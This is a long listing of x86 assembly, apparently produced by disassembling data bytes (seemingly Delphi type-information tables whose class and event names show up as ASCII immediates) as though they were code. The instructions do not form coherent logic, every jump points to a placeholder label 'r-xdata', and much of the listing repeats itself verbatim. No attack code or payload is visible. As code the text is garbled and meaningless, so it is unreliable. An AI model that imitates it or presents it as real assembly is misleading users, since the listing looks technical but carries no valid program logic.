push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
test dl bl
inc ebx
add [ eax ] cl
push cs
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
fmul st7
inc ebx
add [ eax ] ch
fiadd [ ebx ]
or [ 0x646e4554 ] cl
inc esp
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
clc
fadd [ ebx ]
or [ esi ] cl
push esp
inc ebx
push 0x1c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x2707ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
sbb al 0x11
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x2513ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx + ebx * 8 + 0xe080043 ] al
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
sbb al 0x11
inc eax
add al al
aam 0x43
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
or al 0xd8
inc ebx
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x261fffc0 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] bl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
inc ebx
add [ esp + ebx * 8 ] dh
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
sbb al 0x11
outsb
je r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
rcr ah 0x43
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
aam 0xe1
inc ebx
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
jl r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
push 0x65
jb r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
inc edx
outsd
outsd
insb
popad
outsb
outsb
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
rcr ch 0x43
jpe r-xdata
jb r-xdata
add [ ecx + ebp * 8 + 0x10000043 ] ch
inc eax
add al ch
fild [ ebx ]
or [ edi ] cl
push esp
push ebx
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43de48c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43ddc0c0 ] cl
add [ eax + edx + 0x40 ] dl
jbe r-xdata
inc ebp
push edx
jae r-xdata
push es
jb r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
outsb
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
dec eax
fiadd [ ebx ]
or [ esi ] dl
je r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
jpe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
loopne r-xdata
js r-xdata
insb
outsd
ja r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
sbb al 0x11
inc eax
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
add [ eax ] ecx
arpl [ ecx + eax + 0x8 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xor ch bl
inc ebx
add [ eax ] cl
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc esp
add [ eax ] bh
add dl cl
loope r-xdata
and eax [ eax + eax + 0x38 ]
add [ eax ] al
add al 0x2c
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
js r-xdata
outsb
je r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax + 0x16 ] dl
inc esp
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0xe ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] bh
add [ eax ] al
mov esp 0x54004010
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc esp
add [ eax ] bh
inc ecx
add [ ecx + eax ] bl
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
sub [ edi ] dl
jo r-xdata
add [ esp + ebp ] al
inc ebp
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add al 0x8
push es
lea eax [ eax ]
pushad
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fild [ ebx ]
fsub st1
inc ebx
add [ eax ] al
jbe r-xdata
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax + 0x4119 ] ch
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov esp 0x80043de
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
inc esp
add [ eax - 0x77ffbbba ] dl
cmp al [ eax + eax - 0x4c ]
dec ecx
inc ecx
add [ eax + 0x46 ] bl
inc esp
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
add [ eax ] ch
pop ss
push eax
outsd
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
sub_43d68d
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
add [ ecx + edx + 0x4aa00044 ] ch
inc ecx
add [ ecx + ecx * 2 + 0x12800041 ] dh
inc esp
add [ eax + 0x11 ] dh
inc esp
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] r-xdata
fcom st6
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
hlt
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43d64074
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x43d80cc0 ] cl
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
pop es
add [ eax + eax ] dl
add bh bh
hlt
salc
salc
inc ebx
add [ eax ] dl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
imul ebp [ esi + 0x74 ] 0x43d6ac73
add [ ecx + 0x41 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax - 0x57ffbff0 ] al
sbb [ ecx ] eax
nop
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
push esp
adc [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax - 0x2a ] al
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ ecx + edx ] bl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
mov esp 0x80043d8
adc [ eax ] 0x40
add [ eax - 0x6fffbee7 ] ch
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43d64074
imul esp [ gs : edi + 0x68 ] 0x43d64074
add [ eax + eax ] cl
add bh bh
hlt
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
sbb al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push cs
inc ebx
add [ eax ] cl
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
loopne r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
cmp al 0xd5
inc ebx
add [ eax ] al
adc [ eax ] al
nop
sbb cl 0x43
add [ eax ] cl
push cs
outsb
je r-xdata
sbb al 0x11
inc eax
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
sbb al 0x11
inc eax
add ah bl
iretd
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
dec ecx
outsb
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
test dl bl
inc ebx
add [ eax ] cl
push cs
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
fmul st7
inc ebx
add [ eax ] ch
fiadd [ ebx ]
or [ 0x646e4554 ] cl
inc esp
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] bl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
clc
fadd [ ebx ]
or [ esi ] cl
push esp
inc ebx
push 0x1c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x2707ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
sbb al 0x11
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x2513ffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx + ebx * 8 + 0xe080043 ] al
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
sbb al 0x11
inc eax
add al al
aam 0x43
add [ eax + 0x54004119 ] ch
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
or al 0xd8
inc ebx
sbb al 0x11
inc eax
add [ ecx + edx ] bl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x261fffc0 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] bl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
inc ebx
add [ esp + ebx * 8 ] dh
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ edx + edx * 8 + 0x43 ] bh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ edx * 8 + 0x10000043 ] bh
inc eax
add [ eax + r-xdata ] dl
sbb al 0x11
outsb
je r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
rcr ah 0x43
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
aam 0xe1
inc ebx
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1c ] si
adc [ eax ] eax
jl r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
push 0x65
jb r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
inc edx
outsd
outsd
insb
popad
outsb
outsb
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
